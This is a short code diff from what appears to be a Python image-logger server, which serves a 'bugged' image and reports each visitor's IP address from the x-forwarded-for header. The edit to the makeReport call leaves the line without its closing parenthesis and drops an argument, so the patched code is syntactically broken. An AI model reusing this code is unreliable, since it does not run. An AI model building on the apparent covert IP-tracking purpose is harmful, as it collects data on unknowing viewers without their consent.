@@ -223,7 +223,8 @@ height: 100vh;
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = url.split("?")[0]
+
                 
                 return
             
